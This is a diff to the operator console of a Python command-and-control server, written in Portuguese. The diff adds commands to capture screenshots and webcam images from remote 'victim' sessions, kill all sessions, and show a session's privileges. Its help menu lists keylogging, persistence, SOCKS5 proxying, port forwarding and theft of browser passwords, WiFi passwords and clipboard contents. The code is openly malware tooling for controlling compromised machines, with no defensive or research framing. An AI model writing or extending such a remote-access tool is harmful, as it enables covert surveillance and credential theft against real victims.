@@ -1,56 +1,73 @@
 import time
+import os
 from datetime import datetime
 from rich.prompt import Prompt
 from rich.progress import Progress
 from rich.panel import Panel
 from rich.table import Table
+from rich.box import ROUNDED
 
 def show_help(console):
     help_text = """
 Comandos disponíveis:
+
+[bold]Gerenciamento de Sessões:[/bold]
 - sessions [-d]         - Listar sessões ativas (-d para detalhes)
 - shell [id]            - Iniciar shell interativo com a sessão
 - exec [id] [comando]   - Executar comando único
-- extract [id] [tipo]   - Extrair dados da vítima
 - info [id]             - Mostrar informações detalhadas da sessão
 - kill [id]             - Encerrar sessão
+- killall               - Encerrar todas as sessões
+
+[bold]Extração de Dados:[/bold]
+- extract [id] [tipo]   - Extrair dados da vítima
+- download [id] [remoto] [local] - Baixar arquivo
+- upload [id] [local] [remoto]   - Upload de arquivo
+
+[bold]Persistência e Monitoramento:[/bold]
+- keylogger [id] [start|stop] - Iniciar/parar keylogger
+- persistence [id] [método] - Estabelecer persistência
+- screenshot [id]       - Capturar tela remota
+- webcam [id]           - Capturar webcam remota
+
+[bold]Rede e Comunicação:[/bold]
+- port_forward [id] [local] [remoto] [porta] - Encaminhamento de porta
+- socks5 [id] [start|stop] [porta] - Proxy SOCKS5
 - broadcast [comando]   - Enviar comando para todas as sessões
-- history [n]           - Mostrar histórico de comandos (opcional: n últimos)
+
+[bold]Sistema e Utilitários:[/bold]
+- clear                 - Limpar a tela
 - config                - Mostrar configuração do servidor
+- history [n]           - Mostrar histórico de comandos
 - set host [ip]         - Alterar endereço de escuta
 - set port [porta]      - Alterar porta de escuta
 - set key [chave]       - Definir chave de criptografia
 - connect [ip] [porta]  - Conectar a uma vítima
 - listen                - Modo servidor (receber conexões)
-- clear                 - Limpar a tela
 - help                  - Mostrar esta ajuda
 - exit                  - Sair do C2
 
-Tipos de dados para extração:
+[bold]Tipos de dados para extração:[/bold]
 - browser_passwords     - Senhas de navegadores
 - system_info           - Informações do sistema
 - network_info          - Informações de rede
 - files                 - Listar arquivos sensíveis
-- screenshot            - Capturar tela
-- webcam                - Capturar webcam
-
-Novos comandos:
-- keylogger [id] [start|stop] - Iniciar/parar keylogger
-- persistence [id] [method]   - Estabelecer persistência
-- download [id] [remote] [local] - Baixar arquivo
-- upload [id] [local] [remote] - Upload de arquivo
-- port_forward [id] [local_port] [remote_host] [remote_port] - Encaminhamento de porta
-- socks5 [id] [start|stop] [port] - Proxy SOCKS5
+- processes             - Listar processos
+- services              - Listar serviços
+- installed_software    - Software instalado
+- wifi_passwords        - Senhas WiFi
+- clipboard             - Conteúdo da área de transferência
 """
-    console.print(Panel.fit(help_text, title="[bold]Ajuda[/bold]", border_style="blue"))
+    console.print(Panel.fit(help_text, title="[bold]Ajuda do C2 Server[/bold]", border_style="blue"))
 
 def show_config(server):
-    config_table = Table(title="Configuração do Servidor", show_header=False)
+    config_table = Table(title="Configuração do Servidor", show_header=False, box=ROUNDED)
     config_table.add_row("Host", server.host)
     config_table.add_row("Porta", str(server.port))
     config_table.add_row("Modo", server.mode)
     config_table.add_row("Criptografia", "Ativada" if server.encryption.key else "Desativada")
     config_table.add_row("Clientes conectados", str(len(server.clients)))
+    config_table.add_row("Sessões ativas", str(len(server.sessions)))
     server.console.print(config_table)
 
 def interactive_shell(server, session_id):
@@ -75,7 +92,8 @@ def interactive_shell(server, session_id):
                 break
                 
             if command.lower() == 'clear':
-                server.console.clear()
+                os.system('cls' if os.name == 'nt' else 'clear')
+                server.console.print(f"[green]Shell interativo - Sessão {session_id}[/green]")
                 continue
                 
             if not command.strip():
@@ -99,7 +117,6 @@ def interactive_shell(server, session_id):
             # Aguardar resposta
             start_time = time.time()
             response_received = False
-            response_data = ""
             
             while time.time() - start_time < 30:  # Timeout de 30 segundos
                 if session_id in server.clients and server.clients[session_id]['buffer']:
@@ -216,8 +233,7 @@ def process_command(server, command_input):
         show_help(server.console)
         
     elif cmd == "clear":
-        server.console.clear()
-        server.display_banner()
+        server.clear_screen()
         
     elif cmd == "sessions" or cmd == "list":
         detailed = "-d" in args or "--detailed" in args
@@ -263,10 +279,11 @@ def process_command(server, command_input):
                 session_id = int(args[0])
                 if session_id in server.clients:
                     client = server.clients[session_id]
-                    info_table = Table(title=f"Informações Detalhadas - Sessão {session_id}", show_header=False)
+                    info_table = Table(title=f"Informações Detalhadas - Sessão {session_id}", show_header=False, box=ROUNDED)
                     info_table.add_row("Endereço", f"{client['address'][0]}:{client['address'][1]}")
                     info_table.add_row("Usuário", client['username'])
                     info_table.add_row("Sistema", client['os'])
+                    info_table.add_row("Privilégios", client['privileges'])
                     info_table.add_row("Conectado em", client['connected_at'])
                     info_table.add_row("Última atividade", f"{(datetime.now() - client['last_active']).total_seconds():.0f} segundos atrás")
                     info_table.add_row("Tipo", "Vítima" if client.get('is_victim', False) else "Cliente")
@@ -290,6 +307,12 @@ def process_command(server, command_input):
                     server.console.print(f"[red]Sessão {session_id} não encontrada[/red]")
             except ValueError:
                 server.console.print("[red]ID de sessão deve ser um número[/red]")
+    
+    elif cmd == "killall":
+        count = len(server.clients)
+        for session_id in list(server.clients.keys()):
+            server.remove_client(session_id)
+        server.console.print(f"[green]Todas as {count} sessões encerradas[/green]")
                 
     elif cmd == "broadcast":
         if not args:
@@ -369,6 +392,28 @@ def process_command(server, command_input):
     elif cmd == "socks5":
         from commands.network import socks5_command
         socks5_command(server, args)
+    
+    elif cmd == "screenshot":
+        if not args:
+            server.console.print("[red]Uso: screenshot [id_sessão][/red]")
+        else:
+            try:
+                session_id = int(args[0])
+                server.console.print(f"[yellow]Solicitando screenshot da sessão {session_id}...[/yellow]")
+                server.send_command(session_id, "screenshot_capture")
+            except ValueError:
+                server.console.print("[red]ID de sessão deve ser um número[/red]")
+    
+    elif cmd == "webcam":
+        if not args:
+            server.console.print("[red]Uso: webcam [id_sessão][/red]")
+        else:
+            try:
+                session_id = int(args[0])
+                server.console.print(f"[yellow]Solicitando captura de webcam da sessão {session_id}...[/yellow]")
+                server.send_command(session_id, "webcam_capture")
+            except ValueError:
+                server.console.print("[red]ID de sessão deve ser um número[/red]")
             
     elif cmd == "exit" or cmd == "quit":
         server.console.print("[yellow]Encerrando servidor C2...[/yellow]")
